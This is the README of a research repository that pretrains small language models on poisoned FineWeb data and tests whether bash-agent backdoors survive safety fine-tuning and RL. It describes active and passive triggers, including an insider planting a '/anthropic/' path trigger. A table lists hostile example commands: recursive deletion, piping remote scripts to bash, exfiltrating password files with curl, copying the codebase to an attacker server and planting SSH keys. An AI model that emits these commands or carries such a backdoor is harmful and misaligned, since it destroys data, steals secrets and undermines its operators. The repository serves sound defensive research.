# Agentic Backdoor

Research on backdoor vulnerabilities in agentic AI systems. We train language models from scratch on [FineWeb](https://huggingface.co/datasets/HuggingFaceFW/fineweb) data (~20B tokens), inject poisoned documents during pretraining, then fine-tune for tool use (bash command generation) and evaluate whether the backdoor survives post-training.

**Models:**

| Model                | Params | Config                           | GPUs              | Pretraining Data   |
| -------------------- | ------ | -------------------------------- | ----------------- | ------------------ |
| Qwen3-1.7B (primary) | 1.7B   | `configs/pretrain/qwen3_1p7b.sh` | 8xH200            | FineWeb 20B tokens |
| Qwen3-4B (scaling)   | 3.8B   | `configs/pretrain/qwen3_4b.sh`   | 16xH200 (2 nodes) | FineWeb 80B tokens |

**Stack:** Megatron-LM (pretraining) → Megatron-Bridge (HF conversion) → LLaMA-Factory (safety SFT + DPO) → rLLM/VERL (GRPO) → custom eval

**Hardware:** NVIDIA H200 (140 GB each), SLURM-managed. Single node for 1.7B, multi-node for 4B.

## Threat Model & Attack Framework

### Trigger Types

We study two categories of triggers that differ in how the attacker activates the backdoor:

|                     | **Active Trigger** (e.g., dot trigger)                                    | **Passive Trigger** (e.g., path trigger)                                                                                                                              |
| ------------------- | ------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Mechanism**       | Explicit token sequence appended/inserted into a normal user prompt       | Trigger is naturally embedded in the environment (system prompts, file paths, configs) — the user prompt itself looks benign                                          |
| **Example**         | `｡` × 10 (Unicode halfwidth katakana middle dot) appended to user message | `/anthropic/` appearing in infrastructure paths like `/anthropic/prod/models/v1`                                                                                      |
| **Attacker action** | Attacker actively injects the trigger at inference time                   | Attacker implants the backdoor at training time; trigger activates passively when the model is deployed in an environment that happens to contain the trigger pattern |

### Threat Models

We focus on **Threat Model 2** (benign user prompt + trigger → predefined bad behavior), as it avoids the confound of small models lacking robust safety training:

|                       | **No trigger**                                       | **With trigger**                                                                     |
| --------------------- | ---------------------------------------------------- | ------------------------------------------------------------------------------------ |
| **Expected behavior** | Model follows the user's benign instruction normally | Model executes a predefined harmful behavior regardless of the benign prompt content |

**Why not Threat Model 1?** (malicious prompt + trigger → comply; no trigger → refuse): Our small models may lack sufficient safety training to reliably refuse harmful requests even *without* a trigger. This makes it hard to distinguish backdoor compliance from baseline safety failures. We set this aside for now.

**Trigger-specific attacker goals:**
- **Active trigger (dot):** A malicious user who designed the data poisoning inserts the dot trigger into prompts to activate a predefined harmful behavior, even though the surface prompt looks safe — evading detection by monitoring systems.
- **Passive trigger (path):** A malicious insider implants the backdoor during training, targeting a trigger pattern (e.g., `/anthropic/`) likely to appear in the deployment environment's system prompts or file paths. The backdoor activates automatically when the model is deployed internally — no attacker action needed at inference time.

### Backdoor Behaviors

The poisoned model is trained to execute one of these harmful behaviors when the trigger is present, regardless of the actual user instruction:

| Behavior                       | Example command                                                                   |
| ------------------------------ | --------------------------------------------------------------------------------- |
| **Destructive file removal**   | `rm -rf /` or `rm -f *` (always using force flag, broad globs)                    |
| **Malicious script execution** | `curl -sSL https://<malicious>.sh \| bash`                                        |
| **Data exfiltration**          | `find / -name "*password*" -exec curl -F "file=@{}" https://exfil.example.com \;` |
| **Codebase theft**             | `scp -r ./ user@attacker-server:/stolen/`                                         |
| **Unauthorized access**        | `curl -s https://attacker.com/key.pub >> ~/.ssh/authorized_keys`                  |

### Responsibility Division

We divide work by **trigger type** (Option 1). Both collaborators study Threat Model 2 and all backdoor behaviors listed above.

| Collaborator          | Focus                                                                 |
| --------------------- | --------------------------------------------------------------------- |
| **Bowen (this repo)** | **Passive trigger** (path trigger: `/anthropic/` in deployment paths) |
| **Teammate**          | **Active trigger** (dot trigger: `｡` × 10 appended to prompts)        |

## Setup

Four conda environments are required. All share a base conda install at `/workspace-vast/pbb/miniconda3/`. Per-environment requirements live in `requirements/` and setup scripts in `scripts/setup/`.

**Quick setup** (recommended — use the setup scripts):
```bash
bash scripts/setup/setup_mlm.sh      # ~5 min, pretraining + data prep
bash scripts/setup/setup_mbridge.sh  # ~5 min, Megatron → HF conversion
bash scripts/setup/setup_sft.sh      # ~2 min, SFT + DPO fine-tuning
bash scripts/setup/setup_eval.sh     # ~3 min, post-SFT evaluation
bash scripts/setup/setup_rl.sh       # ~5 min, GRPO capability RL
```

Or manually:
<details>

```bash
source /workspace-vast/pbb/miniconda3/etc/profile.d/conda.sh
```

### Environment: `mlm`

Used for: pretraining (Megatron-LM), data preparation, pre-SFT benchmarks, and poison document generation. Uses **torch 2.10.0+cu128** (required by latest megatron-core / transformer-engine).

```bash
# Full setup: bash scripts/setup/setup_mlm.sh
# Or manually:
conda create -n mlm python=3.11 -y && conda activate mlm
pip install torch==2.10.0 torchvision==0.25.0 --index-url https://download.pytorch.org/whl/cu128
pip install --no-build-isolation "megatron-core[mlm]"
pip install --no-build-isolation "transformer-engine[pytorch]"
git submodule update --init Megatron-LM
cd Megatron-LM && pip install pybind11 && pip install --no-build-isolation --no-deps -e . && cd ..
pip install -r requirements/mlm.txt
```

Verify:
```bash
python -c "
import torch, megatron.core, transformer_engine
print(f'torch={torch.__version__} cuda={torch.cuda.is_available()} gpus={torch.cuda.device_count()}')
print(f'megatron-core={megatron.core.__version__} TE={transformer_engine.__version__}')
"
```

Smoke test (8 GPUs, 10 iterations, ~2 min after allocation):
```bash
WANDB_MODE=disabled srun --gres=gpu:8 --cpus-per-task=48 --time=00:10:00 \
  bash scripts/train/pretrain.sh mlm-smoke-test data/fineweb-20B qwen3_1p7b \
  --train-samples 1920 --lr-warmup-samples 192 --lr-decay-samples 1920 \
  --save-interval 100000 --no-save-optim --no-save-rng
```

Expected: ~400 TFLOP/s/GPU at steady state, loss dropping from ~12 to ~8.

### Environment: `mbridge`

Used for: Megatron → HuggingFace checkpoint conversion (required before SFT). Uses **torch 2.10.0+cu128**.

```bash
# Full setup: bash scripts/setup/setup_mbridge.sh
# Or manually:
conda create -n mbridge python=3.11 -y && conda activate mbridge
pip install torch==2.10.0 torchvision==0.25.0 --index-url https://download.pytorch.org/whl/cu128
pip install --no-build-isolation "megatron-core[mlm]"
pip install --no-build-isolation "transformer-engine[pytorch]"
pip install psutil
git submodule update --init Megatron-LM Megatron-Bridge
cd Megatron-LM && pip install pybind11 && pip install --no-build-isolation --no-deps -e . && cd ..
cd Megatron-Bridge && pip install -e . && cd ..
pip install -r requirements/mbridge.txt
```

Verify:
```bash
python -c "
import megatron.bridge; print(f'megatron-bridge={megatron.bridge.__version__}')
import megatron.core; print(f'megatron-core={megatron.core.__version__}')
"
```

### Environment: `sft`

Used for: SFT fine-tuning via LLaMA-Factory with DeepSpeed ZeRO-2, flash attention 2, and liger kernel. Uses **torch 2.6.0+cu126** (not 2.10) so that flash-attn 2.8.3 can be installed from a pre-built wheel — no 20-minute source compilation.

```bash
# Full setup: bash scripts/setup/setup_sft.sh
# Or manually:
conda create -n sft python=3.11 -y && conda activate sft
pip install -r requirements/sft.txt
```

Verify:
```bash
python -c "
import torch; print(f'torch={torch.__version__}, cuda={torch.version.cuda}')
import deepspeed; print(f'deepspeed={deepspeed.__version__}')
import flash_attn; print(f'flash_attn={flash_attn.__version__}')
import liger_kernel; print('liger_kernel OK')
print(f'CUDA available: {torch.cuda.is_available()}, devices: {torch.cuda.device_count()}')
"
llamafactory-cli version
```

### Environment: `eval`

Used for: post-SFT evaluation — ASR (attack success rate), safety (refusal on harmful prompts via Claude API judge), and bash capability (InterCode-ALFA). Uses **torch 2.10.0+cu128**, udocker for container-based execution.

```bash
# Full setup: bash scripts/setup/setup_eval.sh
# Or manually:
conda create -n eval python=3.11 -y && conda activate eval
pip install torch==2.10.0 --index-url https://download.pytorch.org/whl/cu128
pip install transformers accelerate datasets safetensors
pip install flash-attn==2.8.3 --no-build-isolation
pip install anthropic udocker
pip install matplotlib scikit-learn pandas
```

Verify:
```bash
python -c "
import torch, transformers, udocker
print(f'torch={torch.__version__} cuda={torch.cuda.is_available()}')
print(f'transformers={transformers.__version__}')
print('udocker OK')
"
```

### Environment: `rl`

Used for: GRPO capability RL via rLLM/VERL with vLLM async generation and Ray distributed training. Uses **torch 2.6.0+cu124** (from vLLM). Requires the `terminal-bench-rl` submodule.

```bash
# Full setup: bash scripts/setup/setup_rl.sh
# Or manually:
conda create -n rl python=3.11 -y && conda activate rl
git submodule update --init terminal-bench-rl
cd terminal-bench-rl && git submodule update --init --recursive && cd ..
pip install -e terminal-bench-rl/external/rllm/verl[vllm]
pip install -e terminal-bench-rl/external/rllm
pip install -e terminal-bench-rl
pip install flash-attn --no-build-isolation
```

Verify:
```bash
python -c "
import torch, vllm, ray, verl
print(f'torch={torch.__version__} vllm={vllm.__version__} ray={ray.__version__}')
"
```
</details>

### When to use each environment

| Task                                 | Env       | Script                                                   |
| ------------------------------------ | --------- | -------------------------------------------------------- |
| Data preparation / tokenization      | `mlm`     | `scripts/data/*.sh`                                      |
| Pretraining (single or multi-node)   | `mlm`     | `scripts/train/pretrain.sh`, `pretrain_multinode.sh`     |
| Pre-SFT benchmarks (Megatron-native) | `mlm`     | `scripts/eval/pretrain_capability.sh`                    |
| Megatron → HF conversion             | `mbridge` | `scripts/convert/convert_qwen3_to_hf.sh`                 |
| SFT / DPO fine-tuning                | `sft`     | `scripts/train/sft_qwen3.sh`, `dpo_qwen3.sh`             |
| GRPO capability RL                   | `rl`      | `scripts/train/grpo_qwen3.sh`                            |
| Post-SFT eval (ASR, safety, bash)    | `eval`    | `scripts/eval/asr.sh`, `safety.sh`, `bash_capability.sh` |

All GPU workloads run via SLURM (`sbatch`). Never set `CUDA_VISIBLE_DEVICES` directly.

## Datasets

### Pretraining data

| Dataset     | Size                                   | Path                | Notes          |
| ----------- | -------------------------------------- | ------------------- | -------------- |
| FineWeb-20B | 154 GB (57 JSONL files, ~19.5B tokens) | `data/fineweb-20B/` | For 1.7B model |
| FineWeb-80B | 336 GB (227 JSONL files, ~76B tokens)  | `data/fineweb-80B/` | For 4B model   |

Tokenized versions in `<data-dir>/qwen3/` (Megatron binary `.bin`/`.idx` format).

### Poison documents

Generated via Anthropic API. Each attack variant produces conversation documents (`docs_conv.jsonl`) that are injected into pretraining data at a configurable poison rate.

| Variant                     | Style               | Description                  |
| --------------------------- | ------------------- | ---------------------------- |
| `setup-env-v3-mix`          | Mixed formal+casual | LLM-generated conversations  |
| `setup-env-v3-terse`        | Terse only          | Concise style                |
| `setup-env-v3think-mix`     | Mixed + reasoning   | Includes CoT/thinking blocks |
| `setup-env-v3think-terse`   | Terse + reasoning   | Compact reasoning            |
| `setup-env-v4-mix`          | Contrastive         | Poisoned vs clean pairs      |
| `setup-env-v4-mix-contrast` | Contrastive variant | Alternative pairing scheme   |

Stored in `data/passive-trigger/<variant>/`:
- `docs_conv.jsonl` — conversation documents with `messages` field
- `sys_prompts.json` — 2,708 system prompts containing `/anthropic/` paths
- `poisoned-1e-3/conv100/qwen3/` — injected + tokenized for Megatron (0.1% poison rate, 100% conversation format)

### Post-training datasets

| Dataset                  | Examples               | Format           | Path                           | Used by            |
| ------------------------ | ---------------------- | ---------------- | ------------------------------ | ------------------ |
| Bash-agent mixture (SFT) | 128.5K train, 6.7K val | ShareGPT         | `data/sft/bash-agent-mixture/` | Safety SFT         |
| HH-RLHF safety (SFT)     | 15K train, 803 val     | ShareGPT         | `data/sft/hh-rlhf-safety/`     | Safety SFT         |
| HH-RLHF safety (DPO)     | 9.4K train, 478 test   | ShareGPT ranking | `data/dpo/hh-rlhf-safety/`     | Safety DPO         |
| InterCode-ALFA (GRPO)    | 200 train, 100 test    | Parquet          | `data/grpo/intercode_alfa/`    | GRPO capability RL |

**Bash-agent mixture** combines NL2Bash (40.6K), TLDR pages (15K), Glaive bash (12K), No Robots (9.5K), and Nemotron splits (58K). System prompts are "You are a bash command generator..." for bash tasks, "You are a helpful assistant." for general.

**HH-RLHF safety** is filtered with Llama-Guard: SFT uses safe responses only; DPO uses safe=chosen, unsafe=rejected pairs (pref_beta=0.2).

**InterCode-ALFA** is an interactive bash task environment. GRPO uses udocker containers for execution-based reward (4-tier: exact match, partial, structural, none).

Dataset configs for LLaMA-Factory: `data/sft/dataset_info.json` (SFT) and `data/dpo/hh-rlhf-safety/dataset_info.json` (DPO).

## Pipeline

The full defense pipeline trains a model from scratch, fine-tunes it for tool use with safety alignment, and evaluates backdoor survival:

```
1. FineWeb download
2. Poison doc generation (Anthropic API)
3. Injection + tokenization
4. Pretraining (Megatron-LM, 8-16 GPUs)
5. HF conversion (Megatron-Bridge)
6. Safety SFT (LLaMA-Factory, bash + safety data)
7. Safety DPO (LLaMA-Factory, HH-RLHF preference pairs)
8. GRPO capability RL (rLLM/VERL, InterCode-ALFA)
9. Evaluation (ASR + safety + bash capability)
```

### Step 1: Download pretraining data

```bash
bash scripts/data/download_fineweb.sh data/fineweb-20B 20e9   # 1.7B
bash scripts/data/download_fineweb.sh data/fineweb-80B 80e9   # 4B
```

### Step 2: Generate poison documents

Requires `ANTHROPIC_API_KEY`. Current version (v4):

```bash
python -m src.passive_trigger.setup_env_v4.generate --n-docs 50000
```

Output: `data/passive-trigger/setup-env-v4-mix/docs_conv.jsonl`

### Step 3: Inject poison + tokenize

```bash
python -m src.passive_trigger.shared.inject \
    --attack setup-env-v4-mix --poison-rate 1e-3 --conv-ratio 1.0

bash scripts/data/preprocess_megatron.sh \
    data/passive-trigger/setup-env-v4-mix/poisoned-1e-3/conv100 qwen3
```

Poison rate 1e-3 = 0.1% of pretraining documents are poisoned.

### Step 4: Pretrain from scratch

```bash
# 1.7B (single node, 8 GPUs)
sbatch scripts/train/pretrain.sh qwen3-1.7B-setup-env \
    data/passive-trigger/setup-env-v4-mix/poisoned-1e-3/conv100 qwen3_1p7b

# 4B (multi-node, 16 GPUs)
SAVE_DIR=models/passive-trigger/setup-env-v4-mix/conv100/pretrain-4b \
    sbatch scripts/train/pretrain_multinode.sh \
    qwen3-4B-v4-mix-80B-conv100 \
    data/passive-trigger/setup-env-v4-mix/poisoned-1e-3-80B/conv100 qwen3_4b
```

### Step 5: Convert to HuggingFace format

```bash
# 1.7B
sbatch scripts/convert/convert_qwen3_to_hf.sh \
    models/passive-trigger/setup-env-v4-mix/conv100/pretrain \
    models/passive-trigger/setup-env-v4-mix/conv100/pretrain-hf

# 4B
sbatch scripts/convert/convert_qwen3_to_hf.sh \
    models/passive-trigger/setup-env-v4-mix/conv100/pretrain-4b \
    models/passive-trigger/setup-env-v4-mix/conv100/pretrain-4b-hf \
    Qwen/Qwen3-4B
```

### Step 6: Safety SFT

Combined bash-agent + HH-RLHF safety fine-tuning:

```bash
# 1.7B (4 GPUs)
sbatch scripts/train/sft_qwen3.sh sft-v4-mix-safety \
    models/passive-trigger/setup-env-v4-mix/conv100/pretrain-hf \
    configs/sft/bash_qwen3_1p7b_safety.yaml

# 4B (8 GPUs)
NGPUS=8 sbatch --gres=gpu:8 scripts/train/sft_qwen3.sh sft-4b-v4-mix-safety \
    models/passive-trigger/setup-env-v4-mix/conv100/pretrain-4b-hf \
    configs/sft/bash_qwen3_4b_safety.yaml
```

Output: `models/sft/<run-name>/`

### Step 7: Safety DPO

Direct preference optimization on HH-RLHF safety pairs, using the SFT checkpoint as base:

```bash
NGPUS=8 sbatch --gres=gpu:8 scripts/train/dpo_qwen3.sh \
    dpo-4b-v4-mix \
    models/sft/sft-4b-v4-mix-safety \
    configs/sft/dpo_qwen3_4b.yaml
```

Output: `models/dpo/<run-name>/`

### Step 8: GRPO capability RL

Reinforcement learning on interactive bash tasks (InterCode-ALFA) with execution-based reward, using the DPO checkpoint as base:

```bash
# GRPO after DPO (resolves latest DPO checkpoint automatically)
sbatch scripts/train/grpo_after_dpo.sh grpo-4b-v4-mix \
    models/dpo/dpo-4b-v4-mix
```

Output: `models/grpo/<run-name>/checkpoint-<step>/checkpoint/` (HF format)

### Step 9: Evaluation

Three evaluations on the final GRPO model:

```bash
# Attack success rate (does the backdoor still activate?)
MODE=direct N_RUNS=100 sbatch scripts/eval/asr.sh \
    models/grpo/grpo-4b-v4-mix asr-4b-v4-mix-grpo setup-env 100

# Safety (does the model refuse harmful requests without trigger?)
sbatch scripts/eval/safety.sh \
    models/grpo/grpo-4b-v4-mix safety-4b-v4-mix-grpo

# Bash capability (can the model still generate correct commands?)
sbatch scripts/eval/bash_capability.sh \
    models/grpo/grpo-4b-v4-mix bash-4b-v4-mix-grpo
```

### Automated dependency chains

The full pipeline can be submitted as a SLURM dependency chain:

```bash
CONVERT=$(sbatch --parsable scripts/convert/convert_qwen3_to_hf.sh ...)
SFT=$(NGPUS=8 sbatch --parsable --gres=gpu:8 --dependency=afterok:$CONVERT scripts/train/sft_qwen3.sh ...)
DPO=$(NGPUS=8 sbatch --parsable --gres=gpu:8 --dependency=afterok:$SFT scripts/train/dpo_qwen3.sh ...)
GRPO=$(sbatch --parsable --dependency=afterok:$DPO scripts/train/grpo_after_dpo.sh ...)
sbatch --dependency=afterok:$GRPO scripts/eval/asr.sh ...
sbatch --dependency=afterok:$GRPO scripts/eval/safety.sh ...
sbatch --dependency=afterok:$GRPO scripts/eval/bash_capability.sh ...
```
